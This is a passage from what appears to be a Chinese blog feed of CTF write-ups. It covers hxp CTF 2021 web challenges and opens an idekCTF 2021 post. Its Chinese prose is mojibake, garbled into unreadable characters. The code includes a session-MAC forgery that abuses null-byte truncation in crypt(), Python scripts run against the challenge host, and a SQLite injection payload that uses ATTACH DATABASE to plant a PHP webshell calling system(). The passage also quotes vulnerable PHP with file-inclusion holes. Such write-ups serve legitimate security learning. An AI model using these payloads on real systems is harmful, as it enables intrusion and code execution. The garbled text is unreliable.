&amp;lt;small&amp;gt;By &amp;lt;?= $entry['user'] ?&amp;gt; &amp;lt;/small&amp;gt;
&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;delete&amp;quot; value=&amp;quot;&amp;lt;?= $entry['id'] ?&amp;gt;&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Delete&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;?php endforeach ?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>‰ΩøÁî®sqliteÂÅöÊï∞ÊçÆÂ∫ìÔºåÈùûÊ®°ÊãüÈ¢ÑÂ§ÑÁêÜÔºåÂè¶Â§ñÂæàÂùëÁàπÁöÑÊääÊØè‰∏ÄÊ¨°ÁöÑËØ∑Ê±ÇÁöÑËÆæÁΩÆ‰∫Ü&lt;code>header('Location: /');&lt;/code>ÂØºËá¥Ê≤°ÊúâÂõûÊòæÔºàÂØºËá¥ËôΩÁÑ∂ÂÆÉÂºÄÂêØ‰∫ÜÊä•ÈîôÁöÑÈÄâÈ°π ‰ΩÜÊòØÊääÂ∏∏ËßÑÁöÑÊä•ÈîôÊ≥®ÂÖ•ÁªôÊØôÊéâ‰∫ÜÔºâ&lt;/p>
&lt;p>È¶ñÂÖà‰ªéÂá†‰∏™Êï∞ÊçÆÂ∫ìÂáΩÊï∞‰∏≠ÊâæÊòØÂê¶ÊúâÂèØ‰ª•Ê≥®ÂÖ•ÁöÑÁÇπÔºå&lt;code>get_entries&lt;/code>Êó†ËæìÂÖ•ÂÄºÁî®‰∏ç‰∫ÜÔºå&lt;code>insert_entry&lt;/code>Áî®‰∫ÜprepareÈ¢ÑÂ§ÑÁêÜ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172155830.png" alt="image-20211220172155830">&lt;/p>
&lt;p>Ââ©‰∏ãÁöÑ&lt;code>get_user&lt;/code>Âíå&lt;code>delete_entry&lt;/code>ÊúâÊòéÊòæÁöÑsqlËØ≠Âè•ÊãºÊé•ÔºàÊó†ËøáÊª§ÔºâÔºåÂ∞ùËØïÂà©Áî®&lt;code>delete_entry&lt;/code>ÁöÑ&lt;code>$user_id&lt;/code>ËøõË°åsqlÊ≥®ÂÖ•ÔºåËÄådockerfile‰∏≠ËÆæÁΩÆ‰∫Üflag.txtÁöÑÊùÉÈôêÔºåÊàë‰ª¨Âè™ËÉΩrceÊù•ÊâßË°å/readflagÔºåÊâÄ‰ª•Ê≥®ÂÖ•‰∏çÊòØÊ≥®Êï∞ÊçÆËÄåÊòØÂ∫îËØ•Ê≥®‰∏Ä‰∏™Á±ª‰ºº&lt;code>&amp;lt;?php echo system('/readflag');?&amp;gt;&lt;/code>ËøôÊ†∑ÁöÑshellËøõÂéªÔºàÂÖ∑‰ΩìÊìç‰ΩúÂú®ÂêéÈù¢&lt;/p>
&lt;p>ËÄåËøôÈáåÁöÑ&lt;code>$user_id&lt;/code>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøápostÂÜçdeleteÊù•ÈÄöËøásession‰∏≠ÁöÑ&lt;code>$id&lt;/code>Êù•ÊéßÂà∂ÔºåËøîÂõû‰ª£Á†Å‰∏≠Â∫∑Â∫∑sessionÈÉ®ÂàÜÁöÑÂÜÖÂÆπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172430751.png" alt="image-20211220172430751">&lt;/p>
&lt;p>ÊòØÊ≤ôÁÆ±ÂºèÁöÑsqliteÊï∞ÊçÆÂ∫ìÔºåÈâ¥ÊùÉÈÉ®ÂàÜ‰ΩøÁî®cookie+Â§çÊùÇÁöÑ‰∏ÄÂ†ÜÂä†ÁõêÂìàÂ∏åÂáΩÊï∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172500240.png" alt="image-20211220172500240">&lt;/p>
&lt;p>‰∏∫‰∫ÜÈÄöËøá&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">hash_equals&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hash_hmac&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁöÑifÊ†°È™åÔºåÊàë‰ª¨ÈúÄË¶Å‰º™ÈÄ†‰∏Ä‰∏™ÂêàÁêÜÁöÑ&lt;code>session&lt;/code>ÂÄº Á±ª‰ºº&lt;code>$id.'|'.$mac&lt;/code>ËøôÊ†∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">PHP_INT_MAX&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hash_hmac&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ΩÜÊòØÊó¢‰∏çÁü•ÈÅì&lt;code>secret&lt;/code>‰πü‰∏çÁü•ÈÅì&lt;code>salt&lt;/code>‚Äî‚Äî‰∫éÊòØÊØîËµõÁöÑÊó∂ÂÄôÂ∞±Âç°Âà∞‰∫ÜËøôÈáåÔºå‰ΩÜÊòØÂÆûÈôÖ‰∏äËøôÈáåÊòØÂèØ‰ª•Á™ÅÁ†¥ÁöÑ&lt;/p>
&lt;p>Ê≥®ÊÑè&lt;code>crypt()&lt;/code>ÁöÑ&lt;code>true&lt;/code>ÂèÇÊï∞ÔºåÂÆÉ‰ºö‰ΩøËæìÂá∫ÂÄºÊòØraw binary dataÔºå‰πüÂ∞±ÊòØËØ¥ÂèëÁîüËøôÁßçÁé∞Ë±°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaaaaaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaaaaaa&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">aaaaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;$2a$07$usesomesillystringforsalt$&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;$2a$07$usesomesillystringforsalt$&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220174142440.png" alt="image-20211220174142440">&lt;/p>
&lt;p>Ê≤°ÈîôÔºÅÊòØÁÜüÊÇâÁöÑÈÖçÊñπ‚Äî‚Äî00Êà™Êñ≠Ôºå&lt;code>\x00&lt;/code>‰πãÂêéÁöÑÂÜÖÂÆπÂ∞ÜË¢´ÂøΩÁï•Ôºå‰πüÂ∞±ÊòØËØ¥ÂØπ‰ªª‰Ωï&lt;code>$id&lt;/code>md5‰πãÂêé‰ª•&lt;code>\x00&lt;/code>ÂºÄÂ§¥ÁöÑÂÄºËøõË°å&lt;code>crypt()&lt;/code>‰πãÂêéÂæóÂà∞ÁöÑ&lt;code>$mac&lt;/code>ÊòØ‰∏ÄÊ†∑ÁöÑÔºÅ&lt;/p>
&lt;p>Áé∞Âú®ÈúÄË¶ÅÁ°ÆÂÆöËøô‰∏™&lt;code>$id&lt;/code>ÂÄºÔºåÊòæÁÑ∂Êú¨Âú∞ÂíåËøúÁ®ãÁöÑ&lt;code>$secret&lt;/code>ÂÄº‰∏ç‰∏ÄÊ†∑ Êó†Ê≥ïÊú¨Âú∞Áõ¥Êé•‰º™ÈÄ†ÔºåÊàë‰ª¨ÁöÑÊñπÊ≥ïÊòØÂ§ßÈáèÁöÑGETËØ∑Ê±ÇÊù•Ëé∑ÂæóÂ§ßÈáèÁöÑÊñ∞cookieÔºåËßÇÂØü&lt;code>|&lt;/code>‰πãÂêéÁöÑÈÉ®ÂàÜÁöÑÂá∫Áé∞Áõ∏ÂêåÁöÑÈ¢ëÁéáÔºåÂõ†‰∏∫‰∏äËø∞ÊÉÖÂÜµÂèëÁîüÁöÑÊ¶ÇÁéáÊòØ1/256ÔºåÂ¶ÇÊûúÂèëÁîü‰∫Ü‰∏§Ê¨° Â∞±ÂèØ‰ª•Á°ÆÂÆöÊòØÊàë‰ª¨Ë¶ÅÊâæÁöÑ&lt;code>$mac&lt;/code>ÂÄº&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">tqdm&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tqdm&lt;/span>
&lt;span style="color:#111">macs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">tqdm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://65.108.176.96:8888/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;%7C&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">mac_0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac_0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182703931.png" alt="image-20211220182703931">&lt;/p>
&lt;p>Êúâ‰∫ÜÂêàÈÄÇÁöÑ&lt;code>$mac&lt;/code>‰πãÂêéÂÜçËÄÉËôëÂ¶Ç‰ΩïÈÄöËøásqliÂÜôshellÔºåÊ†πÊçÆ&lt;a href="https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet">cheat sheet&lt;/a>Êï¥‰∏Ä‰∏™payload&lt;/p>
&lt;pre tabindex="0">&lt;code>1=1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('&amp;lt;?php echo system(\&amp;quot;/readflag\&amp;quot;); ?&amp;gt;'); -- xyz
&lt;/code>&lt;/pre>&lt;p>ÁúãÁùÄÂæàÈ™öÁöÑÂÜôshellÊñπÂºèÔºå‰πãÂâçÂÅöÈ¢òÊ≤°ÊúâËßÅÂà∞ËøáÔºàËøôÊ≥¢Â≠¶Âà∞‰∫ÜÔºâÔºåËøô‰∏™payloadÂ∞±ÊîæÂÖ•cookieÁöÑ&lt;code>$id&lt;/code>ÈÉ®ÂàÜÂç≥ÂèØÔºåÂ∏¶ÁùÄcookieËÆøÈóÆÈ°µÈù¢postÂÜçdelete‰∏ÄÊù°ÂÜÖÂÆπÔºåÂÜçËΩ¨Âà∞/data/qazxsw.phpÈ°µÈù¢Â∞±ÂèØ‰ª•ÁúãÂà∞flag‰∫Ü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">remote_0_mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;FlDRLIZWMTqtYjAugBkToe66C3Q5PaXnGAyzGL6VpiCmfl&lt;/span>&lt;span style="color:#d88200">%2F&lt;/span>&lt;span style="color:#d88200">QjtvYr2QavlI9lmsrMbQnpPfIMr979D1E4bBa71&amp;#39;&lt;/span>
&lt;span style="color:#111">cont&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1=1; ATTACH DATABASE &amp;#39;/var/www/html/data/qazxsw.php&amp;#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (&amp;#39;&amp;lt;?php echo system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/readflag&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">); ?&amp;gt;&amp;#39;); -- xyz&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cont&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">random_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">random_id&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;%7C&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">remote_0_mac&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://65.108.176.96:8888/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cont&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182749173.png" alt="image-20211220182749173">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182536863.png" alt="image-20211220182536863">&lt;/p>
&lt;p>&lt;code>hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://wachter-space.de/2021/12/19/hxp_21">wp&lt;/a>&lt;/p>
&lt;h2 id="counter">***counter&lt;/h2>
&lt;blockquote>
&lt;p>Please check out our minimal view counter. I think it‚Äôs secure. Anyway please no hacks.&lt;/p>
&lt;p>http://49.12.232.139:8008/&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$rmf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -f -- &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;default&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./data&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;reset&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^[a-zA-Z0-9]+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$rmf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">include_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737">https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi">https://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi&lt;/a>&lt;/p>
&lt;h2 id="includers-revenge">***includer&amp;rsquo;s revenge&lt;/h2>
&lt;blockquote>
&lt;p>Just sitting here and waiting for PHP 8.1 (lolphp).&lt;/p>
&lt;p>http://65.108.176.254:8088/&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;read&amp;#39;&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;read&amp;#39;&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">include_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏ÄÂè•ËØùphpÔºå‰∏ç‰ºöÔºåÊëÜ‰∫Ü&lt;/p>
&lt;p>ZeddÂ∏àÂÇÖËøôÁØáÂ§™Âº∫‰∫ÜÔºåÊ∑±ÂÖ•ÂàÜÊûêNginx-&amp;gt;https://tttang.com/archive/1384/&lt;/p>
&lt;p>‰Ωú‰∏∫‰∏ÄÂêçwebÁ∫ØËèúÁãóÔºåÂ§™‰Ω©ÊúçÂá∫È¢ò‰∫∫‰∫ÜÔºåÊòØÁúüÁöÑÂº∫ÔºåÂ•ΩÂéâÂÆ≥ÂïäÂïäÂïäÂïäÂïäÂïäÂïä&lt;/p></description></item><item><title>idekCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/</link><pubDate>Wed, 15 Dec 2021 21:11:49 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctf.idek.team/Challenges">https://ctf.idek.team/Challenges&lt;/a> Ê≥®ÂÜå‰πãÂêé‰∏ÄÁõ¥Êî∂‰∏çÂà∞È™åËØÅÈÇÆ‰ª∂ÔºågmailÂíåqqÈÇÆÁÆ±ÈÉΩ‰∏çË°åÔºå‰ΩÜÊòØÂ•ΩÂÉèÂèØ‰ª•Áõ¥Êé•ÁúãÈ¢ò&lt;/p>
&lt;h2 id="memory-of-php">Memory of PHP&lt;/h2>
&lt;blockquote>
&lt;p>Try to understand how string and variable work in php and also url.
&lt;a href="http://memory-of-php.rf.gd/">http://memory-of-php.rf.gd/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
